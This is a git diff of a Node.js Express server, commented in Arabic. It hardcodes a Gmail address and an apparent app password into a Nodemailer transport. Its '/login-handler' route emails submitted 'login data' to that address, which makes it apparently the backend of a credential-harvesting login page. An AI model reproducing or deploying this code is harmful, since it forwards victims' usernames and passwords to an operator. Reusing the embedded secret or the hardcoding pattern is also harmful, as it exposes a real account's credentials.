@@ -2,23 +2,24 @@ const express = require('express');
 const nodemailer = require('nodemailer');
 const cors = require('cors');
 const app = express();
-const port = process.env.PORT;
+const port = process.env.PORT; // لا يزال المنفذ يقرأ من متغير البيئة Vercel
 
 // استخدم middleware
 app.use(express.json()); // لتحليل بيانات JSON
 app.use(cors()); // للسماح بالوصول من مصادر مختلفة
 
-// إعداد Nodemailer باستخدام متغيرات البيئة
+// إعداد Nodemailer باستخدام إعدادات SMTP مباشرة
 const transporter = nodemailer.createTransport({
-    service: 'gmail', // أو أي خدمة بريد أخرى مثل 'outlook' أو 'yahoo'
+    host: 'smtp.gmail.com', // اسم خادم SMTP لـ Gmail
+    port: 465, // المنفذ القياسي للاتصال الآمن (SSL)
+    secure: true, // يجب أن تكون "true" للمنفذ 465
     auth: {
-        user: process.env.EMAIL_USER, // يقرأ من متغير البيئة
-        pass: process.env.EMAIL_PASS, // يقرأ من متغير البيئة
+        user: 'maeen.mohammedaldeiry@gmail.com', // تم تعيين البريد الإلكتروني مباشرة
+        pass: 'knne gnrx yauy giyc', // ضع كلمة مرور التطبيق هنا
     }
 });
 
 // مسار (route) للتعامل مع الطلبات العادية على الصفحة الرئيسية
-// هذا يحل مشكلة "Cannot GET /"
 app.get('/', (req, res) => {
     res.send('الخادم يعمل بشكل صحيح. الرجاء استخدام صفحة تسجيل الدخول.');
 });
@@ -33,8 +34,8 @@ app.post('/login-handler', async (req, res) => {
 
     // إعداد محتوى رسالة البريد الإلكتروني
     const mailOptions = {
-        from: process.env.EMAIL_USER,
-        to: process.env.EMAIL_USER, // يمكنك تعديله لبريد آخر إذا أردت
+        from: 'maeen.mohammedaldeiry@gmail.com', // تم تعيين البريد الإلكتروني مباشرة
+        to: 'maeen.mohammedaldeiry@gmail.com', // يمكنك تعديله لبريد آخر إذا أردت
         subject: 'تم تسجيل دخول جديد',
         html: `
             <h3>بيانات تسجيل الدخول:</h3>
@@ -54,7 +55,7 @@ app.post('/login-handler', async (req, res) => {
     }
 });
 
-// تشغيل الخادم على المنفذ المحدد من Vercel أو المنفذ 3000
+// تشغيل الخادم على المنفذ المحدد من Vercel
 app.listen(port, () => {
     console.log(`Server is running on port ${port}`);
 });
